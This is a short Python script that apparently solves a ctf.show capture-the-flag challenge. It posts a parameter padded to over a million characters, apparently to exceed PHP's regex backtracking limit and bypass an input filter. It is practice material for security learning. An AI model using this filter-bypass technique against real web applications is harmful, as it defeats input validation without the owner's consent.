import requests
url = "http://756de276-c4f3-4c6a-8b29-95d45b8d5da5.challenge.ctf.show/"
data = {
    'f': 'mumuzi'*170000+'36Dctfshow'
}
res = requests.post(url=url,data=data)
print(res.text)